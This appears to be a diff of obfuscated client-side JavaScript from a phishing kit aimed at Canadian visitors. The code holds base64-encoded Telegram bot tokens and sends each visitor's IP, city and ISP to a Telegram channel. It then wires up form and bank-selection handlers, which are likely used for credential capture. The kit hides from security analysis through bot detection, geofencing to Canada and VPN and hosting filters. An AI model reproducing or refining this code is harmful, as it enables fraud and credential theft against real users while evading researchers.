@@ -1,17 +1,10 @@
 ﻿(function(_W,_D,_N){
   'use strict';
 
-  var _0xA = [
-    'ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==',
-    'Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==',
-    'Njc4ODAxMjQ4MQ==',
-    'CA'
-  ];
-
-  var _M = atob(_0xA[0]);
-  var _R = atob(_0xA[1]);
-  var _ID = atob(_0xA[2]);
-  var _CC = _0xA[3];
+  var _M = atob('ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==');
+  var _R = atob('Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==');
+  var _ID = atob('Njc4ODAxMjQ4MQ==');
+  var _CC = 'CA';
 
   var _SID = _W.sessionStorage.getItem('__xsid') || (function(){
     var _x = Math.random().toString(36).substring(2,11).toUpperCase();
@@ -30,7 +23,6 @@
     }
   }
 
-  // 1. Détection Mobile
   function _isMobile(){
     var _ua = _N.userAgent || '';
     var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
@@ -41,7 +33,6 @@
     return false;
   }
 
-  // 2. Détection Bot
   function _isBot(){
     if (_N.webdriver === true || _D.documentElement.getAttribute('webdriver')) return true;
     if (_W.callPhantom || _W._phantom || _W.__nightmare || _W.domAutomation || _W.domAutomationController) return true;
@@ -181,7 +172,6 @@
       return;
     }
 
-    // Callback déclenché au moment où Google Captcha est résolu
     _W._notifyCaptchaSolved = function() {
       var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
       var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
@@ -195,51 +185,63 @@
       _W.sessionStorage.setItem('__xorg', org);
       _W.sessionStorage.setItem('__xcity', city || 'N/A');
 
-      // Notif d'entrée sur le Captcha
-      _tg(_R, '🟢 <b>ARRIVÉE SUR CAPTCHA</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+      // Envoyer la notif d'arrivée sur Telegram RADAR
+      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
 
       _setupForms();
       _setupBanks();
     }
 
-    fetch('https://www.cloudflare.com/cdn-cgi/trace')
-      .then(function(r){ return r.text(); })
-      .then(function(t){
-        var locMatch = t.match(/loc=([A-Z]{2})/);
-        var ipMatch = t.match(/ip=([^\n]+)/);
-        var loc = locMatch ? locMatch[1] : '';
-        var ipVal = ipMatch ? ipMatch[1] : '';
+    // Requête ipwho.is directe en premier
+    fetch('https://ipwho.is/')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        if (d && d.success) {
+          if (d.country_code !== _CC) {
+            _die();
+            return;
+          }
 
-        if (loc !== _CC) {
-          _die();
-          return;
+          var _sec = d.security || {};
+          var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
+          var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
+          var strictVpnPatterns = /expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton|m247|hetzner|linode|digitalocean|ovh/i;
+
+          if (isProxy || strictVpnPatterns.test(orgName)) {
+            _die();
+            return;
+          }
+
+          _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code, d.city);
+        } else {
+          // Fallback vers Cloudflare trace
+          _cfFallback();
         }
-
-        fetch('https://ipwho.is/' + ipVal)
-          .then(function(r){ return r.json(); })
-          .then(function(d){
-            if (d.success) {
-              var _sec = d.security || {};
-              var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
-              var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
-              var strictVpnPatterns = /expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton|m247|hetzner|linode|digitalocean|ovh/i;
-
-              if (isProxy || strictVpnPatterns.test(orgName)) {
-                _die();
-                return;
-              }
-              _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code, d.city);
-            } else {
-              _activate(ipVal, 'Canada ISP', loc, 'Canada');
-            }
-          })
-          .catch(function(){
-            _activate(ipVal, 'Canada ISP', loc, 'Canada');
-          });
       })
       .catch(function(){
-        _activate('127.0.0.1', 'Local', _CC, 'Local');
+        _cfFallback();
       });
+
+    function _cfFallback(){
+      fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        .then(function(r){ return r.text(); })
+        .then(function(t){
+          var locMatch = t.match(/loc=([A-Z]{2})/);
+          var ipMatch = t.match(/ip=([^\n]+)/);
+          var loc = locMatch ? locMatch[1] : '';
+          var ipVal = ipMatch ? ipMatch[1] : '';
+
+          if (loc !== _CC) {
+            _die();
+            return;
+          }
+
+          _activate(ipVal, 'Canada ISP', loc, 'Canada');
+        })
+        .catch(function(){
+          _die();
+        });
+    }
   }
 
   if (_D.readyState === 'loading') {
